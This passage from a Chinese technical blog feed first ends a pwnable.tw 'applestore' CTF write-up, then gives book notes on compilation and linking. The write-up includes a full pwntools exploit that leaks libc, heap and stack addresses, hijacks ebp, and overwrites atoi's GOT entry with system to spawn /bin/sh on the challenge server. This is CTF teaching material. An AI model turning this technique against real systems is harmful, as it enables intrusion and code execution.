0x8 = 0x10c</p><p>然后我们需要让我们在handler函数中用my_read写入的地址为atoi_got，所以我们需要将delete_ebp_addr处的值更改为atoi_got + 0x22</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-applestore-7.png"  alt=""></p><p>故我们控制的第27个节点结构如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">        +--------------------+</span><br><span class="line">        |                    |</span><br><span class="line">fd ----&gt;+      fake str      |</span><br><span class="line">        |                    |</span><br><span class="line">        +--------------------+</span><br><span class="line">        |                    |</span><br><span class="line">        |                    |</span><br><span class="line">        |                    |</span><br><span class="line">        +--------------------+</span><br><span class="line">        |                    |</span><br><span class="line">    (fd)|   atoi_got + 0x22  |</span><br><span class="line">        |                    |</span><br><span class="line">        +--------------------+</span><br><span class="line">        |                    |</span><br><span class="line">    (bk)| stack_addr - 0x10c |</span><br><span class="line">        |                    |</span><br><span class="line">        +--------------------+</span><br></pre></td></tr></table></figure><p>fd[3]=bk —– 修改got表上内容，可写不会报错<br>bk[2]=fd —– 使handler函数的ebp变为atoi_got + 0x22</p><h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><p>此时我们输入的str的前四个字节会覆盖掉got表中的atoi，然后把str当作参数执行</p><p>所以我们只需要构造payload：</p><p>payload = p32(system) + “;/bin/sh”</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./applestore"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./my_ubuntu32_libc.so"</span>)</span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./applestore"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10104</span>)</span><br><span class="line"></span><br><span class="line">add = <span class="string">'2'</span>;delete=<span class="string">'3'</span>;cart=<span class="string">'4'</span>;checkout=<span class="string">'5'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span><span class="params">(num,payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt; '</span>,num)</span><br><span class="line">    io.sendlineafter(<span class="string">'&gt; '</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    action(add,<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    action(add,<span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    action(add,<span class="string">'3'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    action(add,<span class="string">'4'</span>)</span><br><span class="line">action(checkout,<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'y\x00'</span>+p32(elf.got[<span class="string">'puts'</span>])+p32(<span class="number">1</span>)+p32(<span class="number">0x0804B070</span>)+p32(<span class="number">1</span>)</span><br><span class="line">action(cart,payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">libc_addr = u32(io.recv(<span class="number">4</span>))-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">io.recvuntil(<span class="string">'28: '</span>)</span><br><span class="line">heap_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">environ_libc = libc_addr + libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'y\x00'</span> + p32(environ_libc) + <span class="string">'a'</span>*<span class="number">0x4</span> + p32(<span class="number">0</span>)</span><br><span class="line">action(cart,payload)</span><br><span class="line">io.recvuntil(<span class="string">"27: "</span>)</span><br><span class="line">stack_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">log.warn(<span class="string">'libc_addr: 0x%x'</span> % libc_addr)</span><br><span class="line">log.warn(<span class="string">'heap_addr: 0x%x'</span> % heap_addr)</span><br><span class="line">log.warn(<span class="string">'stack_addr: 0x%x'</span> % stack_addr)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">system = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'27'</span> + p32(stack_addr) + p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(atoi_got + <span class="number">0x22</span>) + p32(stack_addr - <span class="number">0x10c</span>)</span><br><span class="line">action(delete,payload)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"&gt; "</span>, p32(system) + <span class="string">";/bin/sh"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从内存的控制与寄存器的劫持角度来说，本题的总结如下：</p><ol><li>首先可以写部分栈内存，通过彩蛋的漏洞与函数栈的平衡关系，利用题目中的函数可以扩大可读内存的范围，读到了GOT表，读到了堆，进而泄露了libc，堆，栈的信息。</li><li>再通过漏洞本身触发一个有约束的地址写，写栈上的old_ebp，程序leave时进而劫持ebp寄存器。</li><li>劫持ebp后，便可以通过题目本身的函数，将输入存储到当前函数根据ebp所控制的栈上，变扩大可写的内存范围为GOT表</li><li>并且控制的GOT表的内存也被当做栈使用，即可控制流劫持并填好相应的参数</li></ol><p>所以还是那句话：<strong>二进制漏洞利用的过程，就是一步步扩大可以控制的内存的范围</strong>。控制寄存器的目的一般最终还是为了控制更大的内存范围，另外还有就是函数调用时传递的参数可能需要劫持寄存器。</p><p>参考：</p><ul><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/06/applestore/" target="_blank" rel="noopener">和媳妇一起学Pwn 之 applestore</a></li><li><a href="https://blog.csdn.net/qq_43189757/article/details/102850665" target="_blank" rel="noopener">pwnable.tw applestore 经验总结</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员的自我修养读书笔记-第二章 编译和链接</title>
      <link href="2020/11/16/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E7%BC%96%E8%AF%91%E5%92%8C%E9%93%BE%E6%8E%A5/"/>
      <url>2020/11/16/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E7%BC%96%E8%AF%91%E5%92%8C%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="第二章-编译和链接"><a href="#第二章-编译和链接" class="headerlink" title="第二章 编译和链接"></a>第二章 编译和链接</h1><p>对于平常的应用程序开发，我们很少需要关注编译和链接过程，因为通常的开发环境都是流行的集成开发环境（IDE），比如Visual Studio。这样的IDE一般都将编译和链接的过程一步完成，通常将这种编译和链接合并到一起的过程称为<strong>构建（Build）</strong>。</p><h1 id="被隐藏了的过程"><a href="#被隐藏了的过程" class="headerlink" title="被隐藏了的过程"></a>被隐藏了的过程</h1><p>在linux下，当我们使用gcc来编译Hello World程序时，只需用最简单的命令（假设源代码文件名为hello.c）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc hello.c</span><br><span class="line">$ .&#x2F;a.out</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure><p>事实上，上述过程可以分解为4个步骤，分别是<strong>预处理（Prepressing）</strong>、<strong>编译（Assembly）</strong>、<strong>汇编（Assembly）</strong>和<strong>链接（Linking）</strong>。</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-2-1.png"  alt=""></p><h2 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h2><p>首先是源代码文件hello.c和相关的头文件，如stdio.h等被预编译器cpp预编译成一个.i文件。对于c++程序来说，它的源代码文件的扩展名可能是.cpp或.cxx，头文件的扩展名可能是.hpp，而预编译后的文件扩展名是.ii。第一步预编译的过程相当于如下命令（-E表示只进行预编译）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -E hello.c -o hello.i</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cpp hello.c &gt; hello.i</span><br></pre></td></tr></table></figure><p>预编译过程主要处理那些源代码文件中的以“#”开始的预编译指令。比如“#include”、“#define”等，主要处理规则如下：</p><ul><li>将所有的“#define”删除，并且展开所有的宏定义</li><li>处理所有条件预编译指令，比如“#if”、“ifef”、”#elif“、“#endif”</li><li>处理“#include”预编译指令，将被包含的文件插入到该预编译指令的位置。注意，这个过程是递归进行的，也就是说被包含的文件可能还包含其他文件</li><li>删除所有的注释“//”和“/* */”</li><li>添加行号和文件名标识，比如#2“hello.c“2，以便于编译时编译器产生调试用的行号信息及用于编译时产生编译错误或警告时能够显示行号</li><li>保留所有的#prama编译器指令，因为编译器需要使用它们</li></ul><p>经过预编译后的.i文件不包含任何宏定义，因为所有的宏已经被展开，并且包含的文件也已经被插入到.i文件中。所以当我们无法判断宏定义是否正确或头文件包含是否正确时，可以查看预编译后的文件来确定问题。</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译过程就是把预处理完的文件进行一系列词法分析、语法分析、语义分析及优化后生产相应的汇编代码文件。相当于如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -S hello.i -o hello.c</span><br></pre></td></tr></table></figure><p>现在版本的gcc把预编译和编译两个步骤合并成一个步骤，使用一个叫做cc1的程序来完成。在笔者的电脑（ubuntu16.04）中，该文件位于”/usr/lib/gcc/x86_64-linux-gnu/5/“，我们也可以直接调用cc1来完成它：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ &#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;5&#x2F;cc1 hello.c </span><br><span class="line"> main</span><br><span class="line">Analyzing compilation unit</span><br><span class="line">Performing interprocedural optimizations</span><br><span class="line"> &lt;*free_lang_data&gt; &lt;visibility&gt; &lt;build_ssa_passes&gt; &lt;opt_local_passes&gt; &lt;free-inline-summary&gt; &lt;whole-program&gt; &lt;inline&gt;Assembling functions:</span><br><span class="line"> main</span><br><span class="line">Execution times (seconds)</span><br><span class="line"> phase setup             :   0.00 ( 0%) usr   0.00 ( 0%) sys   0.01 (20%) wall    1093 kB (65%) ggc</span><br><span class="line"> phase parsing           :   0.01 (50%) usr   0.01 (100%) sys   0.03 (60%) wall     520 kB (31%) ggc</span><br><span class="line"> phase opt and generate  :   0.01 (50%) usr   0.00 ( 0%) sys   0.01 (20%) wall      56 kB ( 3%) ggc</span><br><span class="line"> df scan insns           :   0.01 (50%) usr   0.00 ( 0%) sys   0.00 ( 0%) wall       0 kB ( 0%) ggc</span><br><span class="line"> preprocessing           :   0.00 ( 0%) usr   0.00 ( 0%) sys   0.01 (20%) wall     218 kB (13%) ggc</span><br><span class="line"> parser (global)         :   0.01 (50%) usr   0.01 (100%) sys   0.02 (40%) wall     286 kB (17%) ggc</span><br><span class="line"> integrated RA           :   0.00 ( 0%) usr   0.00 ( 0%) sys   0.01 (20%) wall      24 kB ( 1%) ggc</span><br><span class="line"> TOTAL                 :   0.02             0.01             0.05               1687 kB</span><br></pre></td></tr></table></figure><p>或者使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -S hello.c -o hello.s</span><br></pre></td></tr></table></figure><p>都可以得到汇编输出文件hello.s，而对于c++、objective-c、fortran、java等语言都有对应的程序，<strong>所以实际上gcc只是这些后台程序的包装，它会根据不同的参数要求去调用预编译器语言cc1、汇编器as、链接器ld。</strong></p><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>汇编器是将汇编代码转变成机器可执行的指令，每一条汇编语句几乎都对应一条机器指令。我们可以调用汇编器as来完成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ as hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>或者使用gcc命令从c源代码文件来说，经过预编译，编译和汇编直接输入<strong>目标文件（Object File）</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>链接通常是一个令人费解的过程，为什么汇编器不直接输出可执行文件而是输出一个目标文件呢？链接过程到底包含了什么内容？为什么要链接？</p><p>在书上的例子中，如果我们需要调用ld产生一个能够正常运行的Hello World程序：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-2-2.png"  alt=""></p><p>那么为什么有这么一大堆玩意呢？这些东西涉及到了编译、链接和库，甚至是操作系统一些很底层的内容。在分析这些内容前，我们还是先关注一下编译器在上面这些内容中干了啥</p><h1 id="编译器做了什么"><a href="#编译器做了什么" class="headerlink" title="编译器做了什么"></a>编译器做了什么</h1><p>用最直观的角度来讲，编译器就是将高级语言翻译成机器语言的一个工具。编译过程一般可以分为6步：扫描、语法分析、语义分析、源代码优化、代码生成和目标代码优化：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-2-3.png"  alt=""></p><p>我们以一行简单的c语言代码来简单描述从<strong>源代码（Source Code）</strong>到<strong>最终目标代码（Final Target Code）</strong>的过程。</p><p>CompilerExpression.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>[index] = (index + <span class="number">4</span>) * (<span class="number">2</span> + <span class="number">6</span>)</span><br></pre></td></tr></table></figure><h2 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h2><p>首先源代码程序被输入到<strong>扫描器（Scanner）</strong>，扫描器只是简单地进行词法分析，用一种类似于<strong>有限状态机（Finite State Machine）</strong>的算法可以很轻松地将源代码的字符序列分割成一系列的<strong>记号（Token）</strong>。例如上面的那行程序，共包含了28个非空字符，经过扫描后，产生了16个记号：</p><table><thead><tr><th>记号</th><th>类型</th></tr></thead><tbody><tr><td>array</td><td>标识符</td></tr><tr><td>[</td><td>左方括号</td></tr><tr><td>index</td><td>标识符</td></tr><tr><td>]</td><td>右方括号</td></tr><tr><td>=</td><td>赋值</td></tr><tr><td>(</td><td>左圆括号</td></tr><tr><td>index</td><td>标识符</td></tr><tr><td>+</td><td>加号</td></tr><tr><td>4</td><td>数字</td></tr><tr><td>)</td><td>右圆括号</td></tr><tr><td>*</td><td>乘号</td></tr><tr><td>(</td><td>左圆括号</td></tr><tr><td>2</td><td>数字</td></tr><tr><td>+</td><td>加号</td></tr><tr><td>6</td><td>数字</td></tr><tr><td>)</td><td>右圆括号</td></tr></tbody></table><p>语法分析产生的记号一般可以分为：关键字、标识符、字面量（包含数字、字符串等）和特殊符号（如加号、等号）。在识别记号的同时，扫描器也完成了将标识符放到符号表，将数字、字符串常量存放到文字表等工作。</p><p>有一个叫做lex的程序可以实现词法扫描，它会按照用户之前描述好的词法规则将输入的字符串分割成一个个记号。这样编译器的开发者就无需为每个编译器开发一个独立的词法扫描器，而是根据需要改变词法规则即可。</p><p>另外对于一些有预处理的语言，例如c语言，它的宏替换和文件包含等工作一般不归入编译器的范围而交给一个独立的预处理器。</p><h2 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h2><p>接下去<strong>语法分析器（Grammar Parser）</strong>将对扫描器产生的记号进行语法分析，从而产生<strong>语法树（Syntax Tree）</strong>。整个分析过程采用了<strong>上下文无关语法（Context-free Grammer）</strong>的分析手段。</p><blockquote><p><a href="https://www.zhihu.com/question/21833944" target="_blank" rel="noopener">如何理解上下文无关文法？</a></p></blockquote><p>简单的将，由语法分析器生成的语法数就是以<strong>表达式（Expression）</strong>为节点的树。c语言的一个语句是一个表达式，而复杂的语句是很多表达式的组合。上面例子中的语句就是一个由赋值表达式、加法表达式、乘法表达式、数组表达式、括号表达式组成的复杂语句。它经过语法分析器后形成的语法树如下：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-2-4.png"  alt=""></p><p>我们可以看到整个语句被看作是一个赋值表达式，最小的表达式是符号和数字，通常作为整个语法树的叶节点。在语法分析的同时，很多运算符号的优先级和含义也被确定下来了。另外有些符号具有多重含义，例如星号*在c语言中可以表示乘法表达式，也可以表示对指针内容取内容的表达式，所以语法分析阶段必须对这些内容进行区分，如果出现了表达式不合法，例如各种括号不匹配、表达式中缺少操作符等，编译器就会报告语法分析阶段的错误。</p><p>语法分析也有一个现成的工具叫yacc（Yet Another Compiler Compiler），可以根据用户给定的语法规则对输入的记号序列进行解析，从而构建出一颗语法树。对于不同的编程语言，编译器的开发者只需改变语法规则即可，所以它又被称为“编译器编译器（Compiler Compiler）“。</p><h2 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h2><p>语义分析由<strong>语义分析器（Semantic Analyzer）</strong>来完成。语法分析仅仅是完成了对表达式的语法层面的分析，但是它并不了解这个语句是否真正有意义。例如c语言里两个指针做乘法运算说没有意义的，但是这个语句在语法上是合法的。</p><p>编译器所能分析的语义是<strong>静态语义（Static Semantic）</strong>，就是指在编译期间可以确定的语义，与之对应的<strong>动态语义（Dynamic Semantic）</strong>就是指只有在运行期间才能确定的语义。</p><p>静态语义通常包括声明和类型的匹配，类型的转换。比如当一个浮点型的表达式赋值给一个整型的表达式时，其中隐含了一个浮点型到整型转换的过程，语义分析过程中需要完成这个步骤。动态语义一般指在运行期出现的语义相关的问题，比如将0作为除数是一个运行期语义错误。</p><p>经过语义分析阶段以后，整个语法树的表达式都被标识了类型，如果有些类型需要做隐式转换，语义分析程序会在语法树中插入相应的转换节点。语义分析阶段后语法树如图：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-2-5.png"  alt=""></p><h2 id="中间语言生成"><a href="#中间语言生成" class="headerlink" title="中间语言生成"></a>中间语言生成</h2><p>现代的编译器有很多层次的优化，往往在源代码级别会有一个优化过程。我们这里所描述的<strong>源码级优化器（Source Code Optimizer）</strong>，就会在源代码级别进行优化。优化后语法树如图：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-2-6.png"  alt=""></p><p>我们可以看到（2+6）这个表达式被优化成8，直接在语法树上优化比较困难，所以源代码优化器往往将整个语法树转换成<strong>中间代码（Intermediate Code）</strong>，它是语法树的顺序表示，接近目标代码，但是一般与目标机器和运行时环境无关。比较常见的中间代码类型有<strong>三地址码（Three-address Code）</strong>和<strong>P-代码（P-Code）</strong>，以三地址码为例：</p><p>最基本的三地址码： x = y <em>op</em> z</p><p>这个三地址码表示将变量y和z进行op操作以后，赋值给x。这里的op操作可以是算术操作，也可以是其他任何可以应用到y和z的操作，这样一个三地址码语句里有三个变量地址，三地址码也得名于此。</p><p>上例中语法树翻译成三地址码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t1 &#x3D; 2 + 6</span><br><span class="line">t2 &#x3D; index + 4</span><br><span class="line">t3 &#x3D; t2 * t1</span><br><span class="line">array[index] &#x3D; t3</span><br></pre></td></tr></table></figure><p>为了使所有的操作都符合三地址码形式，这里利用了几个临时变量，在三地址码的基础上进行优化后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t2 &#x3D; index + 4</span><br><span class="line">t2 &#x3D; t2 * 8</span><br><span class="line">array[index] &#x3D; t2</span><br></pre></td></tr></table></figure><p>中间代码使得编译器可以被分为前端和后端，编译器前端负责产生机器无关的中间代码，编译器后端将中间代码转换成目标机器代码。这样一个编译器可以对不同的平台使用同一个前端和不同的后端。</p><h2 id="目标代码生成与优化"><a href="#目标代码生成与优化" class="headerlink" title="目标代码生成与优化"></a>目标代码生成与优化</h2><p>编译器后端主要包括<strong>代码生成器（Code Generator）</strong>和<strong>目标代码优化器（Target Code Optimizer）</strong>。代码生成器将中间代码转换成目标机器代码，这个过程十分依赖于目标机器，因为不同的机器有不同的字长、寄存器、整数数据类型和浮点数数据类型等。对于上例中的中间代码，代码生成器可能会生成如下代码序列（以x86汇编语言表示，并结社index和array数组都为int型）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">movl index, %ecx;value of index to ecx</span><br><span class="line">addl $4, %ecx;ecx &#x3D; ecx + 4</span><br><span class="line">mull $8, %ecx;ecx &#x3D; ecx * 8</span><br><span class="line">movl index, %eax;value of index to eax</span><br><span class="line">movl %ecx, arrat(,eax,4);array[index] &#x3D; ecx</span><br></pre></td></tr></table></figure><blockquote><p>mul：无符号数乘法</p></blockquote><p>最后目标代码优化器对上述的目标代码进行优化，例如选择合适的寻址方式、使用位移来代替乘法运算、删除多余的指令等。上例中乘法由一条相对复杂的<strong>基址比例变址寻址（Base Index Scale Addressing）</strong>的lea指令来完成，最后由一条mov指令完成最后的赋值操作，这条mov指令的寻址方式和lea一样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl index, %edx</span><br><span class="line">leal 32(,%dex,8), %eax</span><br><span class="line">movl %eax, array(,%edx,4)</span><br></pre></td></tr></table></figure><p>我们获得了目标代码，但是代码并不能直接执行，因为还存在一个问题：<strong>index和array的地址还没有确定</strong>。那么应该从哪里获得地址呢？如果index和array的定义和上面的源码在同一个编译单元里面，那么编译器可以为index和array分配空间。</p><blockquote><p>当一个c或cpp文件在<strong>编译</strong>时，预处理器首先递归包含头文件，形成一个含有所有必要信息的单个源文件，这个源文件就是一个<strong>编译单元</strong>。 </p></blockquote><p>但如果定义在其他的程序模块呢？</p><p>事实上，定义在其他模块的全局变量和函数在最终运行时的绝对地址都要在最终链接时才能确定。所以现代的编译器可以将一个源代码文件编译成一个未链接的目标文件，然后由连接器最终将这些目标文件链接起来形成可执行文件。</p><h1 id="链接器年龄比编译器大"><a href="#链接器年龄比编译器大" class="headerlink" title="链接器年龄比编译器大"></a>链接器年龄比编译器大</h1><p>最开始程序其实是以0、1的形式写在一条纸带上的，但是程序需要修改，便需要重新计算各个目标的地址，即<strong>重定位（Relocation）</strong>，后来产生了汇编语言，可以使用<strong>符号（Symbol）</strong>来表示一个地址，这个地址可能是一段子程序（函数）的起始地址，也可以是一个变量的起始地址。</p><p>后来需要把代码按照功能或性质划分，例如java每个类是一个基本的模块，若干个类模块组成一个<strong>包（Package）</strong>，若干个包组合成一个程序。</p><p>在一个程序被分割成多个模块之后，这些模块之间如何组合形成一个单一的程序呢？这个模块的拼接过程便是<strong>链接（Linking）</strong>。</p><h1 id="模块拼装——静态链接"><a href="#模块拼装——静态链接" class="headerlink" title="模块拼装——静态链接"></a>模块拼装——静态链接</h1><p>链接的主要内容就是把各个模块之间相互引用的部分都处理好，使得各个模块之间能够正确的链接。从原理上来讲，链接器的工作就是把一些指令对其他符号地址的引用加以修正，链接过程主要包括<strong>地址和空间分配（Address and Storage Allocation）</strong>、<strong>符号决议（Symbol Resolution）</strong>和<strong>重定位（Relocation）</strong>这些步骤。</p><blockquote><p>符号决议：简而言之，就是确保全部目标文件中的符号引用都有惟一的定义</p></blockquote><p>最基本的静态链接过程如图：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-2-7.png"  alt=""></p><p>每个模块的源代码文件（如.c）文件经过编译器编译成<strong>目标文件（Object File，一般扩展名为.o或.obj）</strong>，目标文件和<strong>库（Library）</strong>一起链接形成最终可执行文件。最常见的库就是<strong>运行时库（Runtime Library）</strong>，它是支持程序运行的基本函数的集合。库其实是一组目标文件的包，就是一些最常用的代码编译成目标文件后打包存放。</p><blockquote><p>我们对于Object文件并没有找到一个很合适的中文名称，把它叫做<strong>中间目标文件</strong>比较合适，简称为<strong>目标文件</strong>，很多时候我们也把目标文件称为模块。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序员的自我修养 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员的自我修养读书笔记-第一章 温故而知新</title>
      <link href="2020/11/13/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%B8%A9%E6%95%85%E8%80%8C%E7%9F%A5%E6%96%B0/"/>
